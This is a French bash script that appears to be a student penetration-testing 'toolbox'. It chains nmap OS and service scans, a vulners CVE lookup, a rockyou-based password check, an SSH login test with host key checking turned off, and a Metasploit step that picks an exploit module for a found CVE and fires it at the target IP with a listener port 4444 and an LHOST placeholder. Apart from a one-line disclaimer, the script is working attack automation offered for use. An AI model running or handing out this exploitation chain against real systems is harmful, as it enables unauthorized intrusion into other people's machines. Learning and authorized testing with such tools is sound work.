#!/bin/bash

# Définir les couleurs
bleu='\033[34m'
rouge='\033[31m'
vert='\033[32m'
jaune='\033[33m'
reset='\033[0m'

                                                
                                                #### Exploration ####


exploration() {
    echo -e "${bleu}#### Exploration ####${reset}"
    

    exploration_cmd=$(nmap -O -sS $ip_cible)
    
#affiche seulement les informations essentielles
    nom_machine=$(echo "$exploration_cmd" | grep "Nmap scan report for" | awk '{print $5}')
    os_machine=$(echo "$exploration_cmd" | grep "OS details" | awk -F': ' '{print $2}')
    domaine_machine=$(echo "$exploration_cmd" | grep "Nmap scan report for" | awk '{print $6}')

#affiche "Inconnu" si les informations sur la machine ne sont pas trouvées
    nom_machine=${nom_machine:-Inconnu}
    os_machine=${os_machine:-Inconnu}
    domaine_machine=${domaine_machine:-Inconnu}

    echo "Nom de la machine : $nom_machine"
    echo "Type de l'OS : $os_machine"
    echo "Nom du domaine : $domaine_machine"
}

                                                #### 1 - Découverte de ports et Services ####


decouverte_ports_services() {
    echo -e "${bleu}#### Découverte de ports et Services ####${reset}"
    

    nmap_cmd=$(nmap -sV $ip_cible)
    
#extrait et afficher les ports ouverts et les versions des services
    open_ports=$(echo "$nmap_cmd" | grep -E "^[0-9]+/tcp" | grep "open" | awk '{print $1, $3, $4}')
    
    if [ -n "$open_ports" ]; then
        echo "Voici les ports ouverts sur l'adresse $ip_cible :"
        echo "$open_ports"
    else
        echo "Aucun port n'est ouvert sur l'adresse $ip_cible."
        return  
    fi
}

                                        #### 2 - Découverte de vulnérabilités ####


decouverte_vulnerabilites() {
    echo -e "${bleu}#### Découverte de vulnérabilités ####${reset}"
    
    # Récupère les infos de la liste des ports et affiche leurs vulnérabilités
    open_ports=$(echo "$nmap_cmd" | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
    
    echo "Recherche des vulnérabilités connues sur les ports ouverts :"
    vuln_scan=$(nmap --script vulners -sV -p$open_ports $ip_cible)
    
    vuln_info=$(echo "$vuln_scan" | grep "|_" -A 1)
    
    if [ -n "$vuln_info" ]; then
        echo "Voici les vulnérabilités trouvées :"
        echo "$vuln_info"
    else
        echo "Aucune vulnérabilité connue trouvée sur les ports ouverts."
    fi
}

                                                    #### 3 - Analyse de mot de passe ####


analyse_mot_de_passe() {
    echo -e "${bleu}#### Analyse de mot de passe ####${reset}"
    
#vérifie si John the Ripper est installé, si non, l'installe
    if ! command -v john &>/dev/null; then
        apt install john -y
    fi

#vérifie la présence duu fichier dictionnaire 
    fichier_dictionnaire="rockyou.txt"
    if [ ! -f "$fichier_dictionnaire" ]; then
        echo "Erreur : Le fichier de dictionnaire '$fichier_dictionnaire' n'existe pas."
        return  
    fi

    read -sp "Entrez votre mot de passe : " mdp
    echo

#le mot de passe est basé sur une politique de mot de passe pour établir sa robustesse
#vérifie la longueur du mot de passe
    if [ ${#mdp} -ge 14 ]; then
        longueur_mdp=true
    else
        longueur_mdp=false
    fi

    # Vérifie le nombre de majuscules
    majuscule=$(echo "$mdp" | grep -o '[[:upper:]]' | wc -l)
    if [ $majuscule -ge 2 ]; then
        majuscule_ok=true
    else
        majuscule_ok=false
    fi

    # Vérifie la présence de caractères spéciaux
    if echo "$mdp" | grep -q '[^[:alnum:]]'; then
        caractere_spe=true
    else
        caractere_spe=false
    fi

    # Détermine la force du mot de passe
    if $longueur_mdp && $majuscule_ok && $caractere_spe; then
        echo -e "${vert}Mot de passe robuste${reset}"
    elif [ ${#mdp} -gt 9 ] && [ $majuscule -gt 1 ] && ! $caractere_spe; then
        echo -e "${jaune}Mot de passe acceptable${reset}"
    else
        echo -e "${rouge}Mot de passe faible${reset}"
    fi

    # Vérifie si le mot de passe est présent dans le dictionnaire
    if john --wordlist="$fichier_dictionnaire" --stdout | grep -q "$mdp"; then
        echo -e "${rouge}Le mot de passe renseigné est un mot de passe commun${reset}"
    fi

    # Si le mot de passe se trouve dans le dictionnaire, il est potentiellement compromis
    if $longueur_mdp && $majuscule_ok && $caractere_spe && john --wordlist="$fichier_dictionnaire" --stdout | grep -q "$mdp"; then
        echo "Mot de passe potentiellement compromis."
    fi
}

                                    #### 4 - Test d'authentification ####


test_authentification() {
    echo -e "${bleu}#### Test d'authentification ####${reset}"
    

    read -p "Veuillez entrer votre login : " login_user
    echo
    read -sp "Veuillez entrer votre mot de passe : " mdp_user
    echo

 
    sshpass -p "$mdp_user" ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o HostKeyAlgorithms=+ssh-rsa $login_user@$ip_cible 'exit'

    if [ $? -eq 0 ]; then
        echo "Connexion SSH réussie et terminée."
    else
        echo "Échec de la connexion SSH."
    fi
}

                                            #### 5 - Exploitation des vulnérabilités ####


exploitation_metasploit() {
    echo -e "${bleu}#### Exploitation des vulnérabilités ####${reset}"
    
#analyse les vulnérabilités et propose des attaques
    vuln_options=()
    if [[ $vuln_scan =~ "CVE" ]]; then
        echo "Vulnérabilités trouvées :"
        vuln_lines=$(echo "$vuln_scan" | grep "CVE")
        while read -r line; do
            vuln_options+=("$line")
        done <<< "$vuln_lines"
    else
        echo "Aucune vulnérabilité exploitable trouvée."
        return  
    fi

    echo "Choisissez une vulnérabilité à exploiter :"
    select vuln_choice in "${vuln_options[@]}"; do
        if [[ -n $vuln_choice ]]; then
            echo "Vous avez choisi : $vuln_choice"
            break
        else
            echo "Choix invalide. Veuillez réessayer."
        fi
    done

    cve=$(echo "$vuln_choice" | grep -oP 'CVE-\d{4}-\d+')

    echo -e "${jaune}Recherche du module Metasploit pour la vulnérabilité $cve...${reset}"

    modules=$(msfconsole -q -x "search $cve; exit" | grep exploit | awk '{print $1}')

    if [[ -z $modules ]]; then
        echo "Aucun module Metasploit trouvé pour le CVE $cve."
        return 
    fi

    echo "Modules Metasploit trouvés pour $cve :"
    echo "$modules"

    echo "Choisissez un module à utiliser :"
    select module_choice in $modules; do
        if [[ -n $module_choice ]]; then
            echo "Vous avez choisi : $module_choice"
            break
        else
            echo "Choix invalide. Veuillez réessayer."
        fi
    done

    echo -e "${jaune}Lancement de Metasploit pour exploiter la vulnérabilité $cve avec le module $module_choice...${reset}"

    msfconsole -q -x "
use $module_choice
set RHOSTS $ip_cible
set LHOST <votre_IP>
set LPORT 4444
exploit
"

    echo -e "${vert}Exploit terminé.${reset}"
}

#génère un rapport PDF ####
generer_rapport_pdf() {
    echo -e "${bleu}#### Génération du rapport PDF ####${reset}"

#crée un fichier temporaire pour stocker les informations du rapport
    rapport_file=$(mktemp /tmp/rapport_pentest.XXXXXX)

    # Écrit les informations d'exploration dans le fichier
    echo "#### Rapport de Test d'Intrusion ####" > $rapport_file
    echo "" >> $rapport_file
    echo "Date et Heure: $(date)" >> $rapport_file
    echo "Adresse IP cible: $ip_cible" >> $rapport_file
    echo "" >> $rapport_file
    echo "#### Exploration ####" >> $rapport_file
    echo "Nom de la machine: $nom_machine" >> $rapport_file
    echo "Type de l'OS: $os_machine" >> $rapport_file
    echo "Nom du domaine: $domaine_machine" >> $rapport_file
    echo "" >> $rapport_file

#ajoute les résultats de la découverte de ports et services
    echo "#### Découverte de ports et Services ####" >> $rapport_file
    if [ -n "$open_ports" ]; then
        echo "Ports ouverts:" >> $rapport_file
        echo "$open_ports" >> $rapport_file
    else
        echo "Aucun port ouvert trouvé." >> $rapport_file
    fi
    echo "" >> $rapport_file

#ajoute les résultats de la découverte de vulnérabilités
    echo "#### Découverte de vulnérabilités ####" >> $rapport_file
    if [ -n "$vuln_info" ]; then
        echo "Vulnérabilités trouvées:" >> $rapport_file
        echo "$vuln_info" >> $rapport_file
    else
        echo "Aucune vulnérabilité trouvée." >> $rapport_file
    fi
    echo "" >> $rapport_file

#ajoute les résultats de l'analyse de mot de passe
    echo "#### Analyse de mot de passe ####" >> $rapport_file
    if [ $longueur_mdp ] && [ $majuscule_ok ] && [ $caractere_spe ]; then
        echo "Mot de passe robuste" >> $rapport_file
    elif [ ${#mdp} -gt 9 ] && [ $majuscule -gt 1 ] && ! $caractere_spe; then
        echo "Mot de passe acceptable" >> $rapport_file
    else
        echo "Mot de passe faible" >> $rapport_file
    fi

    if john --wordlist="$fichier_dictionnaire" --stdout | grep -q "$mdp"; then
        echo "Le mot de passe renseigné est un mot de passe commun" >> $rapport_file
    fi
    echo "" >> $rapport_file

#ajoute les résultats du test d'authentification
    echo "#### Test d'authentification ####" >> $rapport_file
    if [ $? -eq 0 ]; then
        echo "Connexion SSH réussie et terminée." >> $rapport_file
    else
        echo "Échec de la connexion SSH." >> $rapport_file
    fi
    echo "" >> $rapport_file

#convertit le fichier texte en PDF
    python3 - <<END
from fpdf import FPDF

pdf = FPDF()
pdf.add_page()
pdf.set_font("Arial", size=12)

with open("$rapport_file", "r") as file:
    for line in file:
        pdf.cell(200, 10, txt=line, ln=True)

pdf.output("rapport_pentest.pdf")
END

    echo -e "${vert}Le rapport PDF a été généré : rapport_pentest.pdf${reset}"

    # Supprime le fichier temporaire
    rm -f $rapport_file
}

#### Changer l'IP cible ####
changer_ip_cible() {
    read -p "Entrez la nouvelle adresse IP cible : " ip_cible

    # Valide l'adresse IP saisie par l'utilisateur
    if ! [[ $ip_cible =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "Adresse IP invalide. Veuillez entrer une adresse IP valide."
        return
    fi

    # Effectuer l'exploration sur la nouvelle IP cible
    exploration
}

#### Menu principal ####
afficher_menu_principal() {
    echo -e "${jaune}### TOOLBOX ###${reset}"
    echo "1. Découverte de ports et Services"
    echo "2. Découverte de vulnérabilités"
    echo "3. Analyse de mot de passe"
    echo "4. Test d'authentification"
    echo "5. Exploitation des vulnérabilités avec Metasploit"
    echo "6. Changer l'IP cible"
    echo "7. Générer un rapport PDF"
    echo "8. Quitter"
    echo
    read -p "Choisissez une option : " choix
}

echo -e "${bleu}"
echo " ██████╗  █████╗ ██████╗ ███████╗██████╗ ██╗███╗   ██╗ ██████╗ "
echo "██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║████╗  ██║██╔════╝ "
echo "██║  ███╗███████║██████╔╝█████╗  ██████╔╝██║██╔██╗ ██║██║  ███╗"
echo "██║   ██║██╔══██║██╔══██╗██╔══╝  ██╔══██╗██║██║╚██╗██║██║   ██║"
echo "╚██████╔╝██║  ██║██║  ██║███████╗██║  ██║██║██║ ╚████║╚██████╔╝"
echo " ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ "
echo ""
echo -e "${jaune}By MINORI Tristan${reset}"
echo ""


echo -e "${rouge}Cet outil à pour but du pentensting et ne doit surtout pas être utilisé dans le cadre d'actions illégales ! Nous ne sommes pas responsable d'une utilisation à des fins malveillantes.${reset}"
echo -e "Veuillez commencer par renseigner l'adresse cible."
read -p "Entrez l'adresse IP cible : " ip_cible

# Valide l'adresse IP saisie par l'utilisateur

if ! [[ $ip_cible =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Adresse IP invalide. Veuillez entrer une adresse IP valide."
    return
fi

exploration

while true; do
    afficher_menu_principal

    case $choix in
        1)
            decouverte_ports_services
            ;;
        2)
            decouverte_vulnerabilites
            ;;
        3)
            analyse_mot_de_passe
            ;;
        4)
            test_authentification
            ;;
        5)
            exploitation_metasploit
            ;;
        6)
            changer_ip_cible
            ;;
        7)
            generer_rapport_pdf
            ;;
        8)
            echo "Quitter le script."
            exit 0
            ;;
        *)
            echo "Choix invalide. Veuillez réessayer."
            ;;
    esac
done
